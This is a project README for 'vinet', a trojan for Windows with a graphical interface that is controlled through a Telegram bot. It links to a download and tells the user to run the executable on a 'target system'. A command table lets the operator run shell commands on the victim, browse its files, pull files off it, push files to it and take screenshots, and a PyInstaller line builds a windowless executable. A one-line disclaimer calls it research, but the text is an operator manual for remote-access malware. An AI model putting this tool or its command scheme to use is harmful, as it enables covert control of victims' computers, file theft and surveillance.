# vinet v0.18.6
## gui trojan for windows
### This is a graphical trojan created with [pybotnet](https://github.com/onionj/pybotnet) and tkinter 
> This project uses an older version of pybotnet

> Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf.


### Screenshot:
![VINET](https://github.com/onionj/vinet/blob/master/screenshot/screenshot_vinet.png "VINET GUI")

[*__Download link__*](https://github.com/onionj/vinet/releases)
    
### Features:
* Telegram anti-filter control panel
* get command from telegram and execute scripts 
* get command and send message by third party proxy
* get target info 
* sleep source by Optional message
* get ls (dirctory list)
* export file to targets system
* import file from target system 
* get screenshot


### usage:
1. run VINET.exe on target system
2. Fill in the fields and click the Start button
3. TOKEN == telegram bot api token (Get it from the telegram @botfather) (trojan control pannel)
4. ID == telegram account number ID (get it from @userinfobot) (trojan admin chat id)
5. See Admin panel commands:

### Commmands:

> Send this COMMANDs to your api bot in telegram, using the admin account.

>  for run command on one target:  `<Target_MAC_Address> <command>`    `66619484755211 get_info` 


COMMAND | Sample | DO THIS | version | tested on |
--------|--------|---------|--------------------------|-----------|
`get_info` | `get_info` |return system info | 0.06 | windows, linux |
`do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
`cmd <system command>` | `cmd mkdir new_folder` | run system command in shell or cmd (Be careful not to give endless command like `ping google.com -t`  in windows or `ping google.com` in linux)  TODO:add timeout| 0.07 | windows, linux|
`ls <route>` | `ls C:\ `,` ls /home` |Returns a list of folders and files in that path | 0.09 | windows, linux |
`export_file <link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` |target donwload this file and save to script path route| 0.14 | windows linux|
`import_file <file_route>` |`import_file /home/onionj/folder/somting.png` | get a file from target system (limit:5GB)| 0.17.0 |  windows, linux|
`screenshot` | `screenshot` | Takes a screenshot, uploads it to the online server and return the download link | 0.18.1 |  windows, linux |
`help` | `help` | send commands help | 0.18.5 | windows, linux |




compile app with pyinstaller: `pyinstaller --noconsole --onefile -i "icon.ico" vinet.py`

> if you want use this app on windows 7, compile with python 3.7
